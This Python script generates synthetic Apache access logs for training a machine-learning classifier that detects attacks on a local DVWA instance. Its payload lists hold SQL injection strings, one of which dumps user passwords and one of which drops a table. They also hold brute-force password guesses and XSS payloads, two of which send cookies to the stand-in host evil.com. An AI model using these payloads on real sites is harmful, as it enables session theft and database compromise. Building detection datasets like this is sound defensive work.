"""
generate_logs.py
-----------------
Generates a realistic Apache 'combined' format access.log containing a mix of
NORMAL DVWA traffic and ATTACK traffic (SQL Injection, XSS, Brute Force).

WHY THIS EXISTS:
In a real deployment you would point this project at the actual
XAMPP/apache/logs/access.log file produced while attacking your local DVWA
install (see README.md for the exact manual steps + payloads to use).
This script lets you generate a realistic stand-in log file so you can run
the full pipeline (preprocessing -> ML training -> dashboard) immediately,
and it also serves as labeled training data for the classifier.

Output: data/access.log            (raw Apache combined log, unlabeled - like a real server would produce)
        data/labeled_logs.csv      (same requests, but WITH the true label - used to train the model)
"""

import random
import csv
from datetime import datetime, timedelta
from urllib.parse import quote

random.seed(42)

IPS_NORMAL = [f"192.168.1.{i}" for i in range(100, 140)]
IPS_ATTACK = [f"192.168.1.{i}" for i in range(150, 165)] + ["10.0.0.13", "10.0.0.44", "172.16.5.9"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
]
ATTACK_TOOL_AGENTS = [
    "sqlmap/1.7.2#stable (http://sqlmap.org)",
    "Hydra/9.4",
    "python-requests/2.31.0",
    "curl/8.1.2",
]

NORMAL_PATHS = [
    "/dvwa/index.php", "/dvwa/security.php", "/dvwa/instructions.php",
    "/dvwa/vulnerabilities/view_source.php", "/dvwa/about.php",
    "/dvwa/vulnerabilities/sqli/", "/dvwa/vulnerabilities/xss_r/",
    "/dvwa/vulnerabilities/xss_s/", "/dvwa/login.php", "/dvwa/setup.php",
    "/dvwa/css/main.css", "/dvwa/js/dvwaPage.js",
]

# Benign parameter values used for normal traffic on the SAME endpoints attackers use,
# so the model has to learn from the PAYLOAD, not just the URL path.
NORMAL_SQLI_PARAMS = ["1", "2", "3", "5", "id=7", "id=12"]
NORMAL_XSS_PARAMS = ["name=John", "name=Priya", "name=Guest123"]

# --- Attack payload pools (used ONLY against a local, isolated, intentionally
#     vulnerable DVWA instance you own -- never against systems you don't control) ---
SQLI_PAYLOADS = [
    "1' OR '1'='1", "1' OR '1'='1' -- ", "1 UNION SELECT null,null-- ",
    "1' UNION SELECT user,password FROM users-- ", "1' AND SLEEP(5)-- ",
    "' OR 1=1#", "1'; DROP TABLE users-- ", "1' UNION SELECT database(),version()-- ",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>", "%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E",
    "<body onload=alert('xss')>", "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
]
BRUTE_USERS = ["admin", "root", "administrator", "test"]
BRUTE_PASS_TRIES = ["123456", "password", "admin123", "letmein", "qwerty",
                     "iloveyou", "welcome1", "dvwa123", "toor", "P@ssw0rd"]

STATUS_NORMAL = [200, 200, 200, 200, 304, 302]
STATUS_ATTACK = [200, 500, 403, 200, 200]  # DVWA often returns 200 even on successful injection


def apache_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0530")


def make_row(ts, ip, method, url, status, size, ua, label, attack_type):
    log_line = (
        f'{ip} - - [{apache_time(ts)}] "{method} {url} HTTP/1.1" {status} {size} "-" "{ua}"'
    )
    return log_line, {
        "timestamp": ts.isoformat(),
        "ip": ip,
        "method": method,
        "url": url,
        "status": status,
        "size": size,
        "user_agent": ua,
        "label": label,          # Normal / Attack
        "attack_type": attack_type,  # None / SQL Injection / XSS / Brute Force
    }


def generate(n_normal=1400, n_sqli=140, n_xss=110, n_bruteforce=100, start=None):
    start = start or (datetime.now() - timedelta(days=7))
    t = start
    raw_lines = []
    rows = []

    # ---- Normal traffic ----
    for _ in range(n_normal):
        t += timedelta(seconds=random.randint(5, 90))
        ip = random.choice(IPS_NORMAL)
        ua = random.choice(USER_AGENTS)
        path = random.choice(NORMAL_PATHS)
        if "sqli" in path:
            url = f"{path}?id={random.choice(NORMAL_SQLI_PARAMS)}&Submit=Submit"
        elif "xss" in path:
            url = f"{path}?{random.choice(NORMAL_XSS_PARAMS)}"
        else:
            url = path
        status = random.choice(STATUS_NORMAL)
        size = random.randint(200, 4500)
        line, row = make_row(t, ip, "GET", url, status, size, ua, "Normal", "None")
        raw_lines.append(line)
        rows.append(row)

    # ---- SQL Injection attacks ----
    for _ in range(n_sqli):
        t += timedelta(seconds=random.randint(1, 8))
        ip = random.choice(IPS_ATTACK)
        ua = random.choice(ATTACK_TOOL_AGENTS + USER_AGENTS)
        payload = quote(random.choice(SQLI_PAYLOADS), safe="")
        url = f"/dvwa/vulnerabilities/sqli/?id={payload}&Submit=Submit"
        status = random.choice(STATUS_ATTACK)
        size = random.randint(150, 3000)
        line, row = make_row(t, ip, "GET", url, status, size, ua, "Attack", "SQL Injection")
        raw_lines.append(line)
        rows.append(row)

    # ---- XSS attacks ----
    for _ in range(n_xss):
        t += timedelta(seconds=random.randint(1, 8))
        ip = random.choice(IPS_ATTACK)
        ua = random.choice(ATTACK_TOOL_AGENTS + USER_AGENTS)
        payload = random.choice(XSS_PAYLOADS)
        if not payload.startswith("%"):  # a couple of payloads are already pre-encoded
            payload = quote(payload, safe="")
        reflected = random.choice([True, False])
        path = "/dvwa/vulnerabilities/xss_r/" if reflected else "/dvwa/vulnerabilities/xss_s/"
        url = f"{path}?name={payload}"
        status = random.choice(STATUS_ATTACK)
        size = random.randint(150, 3000)
        line, row = make_row(t, ip, "GET", url, status, size, ua, "Attack", "XSS")
        raw_lines.append(line)
        rows.append(row)

    # ---- Brute Force attacks (bursts of POST /login.php from same IP) ----
    n_bursts = max(1, n_bruteforce // 12)
    remaining = n_bruteforce
    for _ in range(n_bursts):
        ip = random.choice(IPS_ATTACK)
        ua = random.choice(ATTACK_TOOL_AGENTS)
        user = random.choice(BRUTE_USERS)
        burst_size = min(remaining, random.randint(8, 15))
        remaining -= burst_size
        for _ in range(burst_size):
            t += timedelta(milliseconds=random.randint(200, 900))  # rapid-fire requests
            pw = random.choice(BRUTE_PASS_TRIES)
            url = f"/dvwa/login.php?username={user}&password={pw}&Login=Login"
            status = random.choice([200, 302, 401])
            size = random.randint(150, 2500)
            line, row = make_row(t, ip, "POST", url, status, size, ua, "Attack", "Brute Force")
            raw_lines.append(line)
            rows.append(row)
        if remaining <= 0:
            break

    # Shuffle to interleave attacks with normal traffic like a real log, then sort by time
    combined = list(zip(raw_lines, rows))
    combined.sort(key=lambda x: x[1]["timestamp"])
    raw_lines = [c[0] for c in combined]
    rows = [c[1] for c in combined]
    return raw_lines, rows


if __name__ == "__main__":
    raw_lines, rows = generate()

    with open("data/access.log", "w") as f:
        f.write("\n".join(raw_lines) + "\n")

    with open("data/labeled_logs.csv", "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)

    print(f"Generated {len(rows)} log entries -> data/access.log")
    print(f"Labeled training data -> data/labeled_logs.csv")
    from collections import Counter
    print(Counter([r['attack_type'] for r in rows]))
